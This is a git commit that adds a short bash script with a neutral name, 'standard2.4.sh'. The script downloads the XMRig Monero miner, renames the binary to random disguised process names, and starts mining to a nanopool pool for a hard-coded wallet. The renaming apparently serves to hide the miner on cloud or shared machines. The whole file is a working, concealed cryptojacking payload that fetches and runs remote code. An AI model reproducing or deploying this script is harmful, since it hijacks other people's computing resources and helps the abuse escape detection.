34c933bb876af7d6a628f5657dc537f7cb41a282
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2022-11-21 16:38:16 +0700

    Create standard2.4.sh

---
+++ standard2.4.sh
@@ -0,0 +1,18 @@
+#!/bin/bash 
+sudo apt-get update
+VERSION=6.18.1
+azure=mxsemsdnlkdj
+a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+apt-get install -y git wget screen
+wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
+tar -xvzf xmrig-$VERSION-linux-x64.tar.gz
+rm -rf xmrig-$VERSION-linux-x64.tar.gz && cd xmrig-$VERSION
+mv xmrig $azure -n
+cp $azure "$cpuname"
+rm -f  xmrig
+POOL=xmr-us-west1.nanopool.org:14433
+USERNAME=44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao
+ALGO=rx/0
+DONATE=1
+echo $cpuname" is starting"
+./"${cpuname}" --donate-level $DONATE -o $POOL -u $USERNAME.metan -p x -a $ALGO -k --tls -t 8
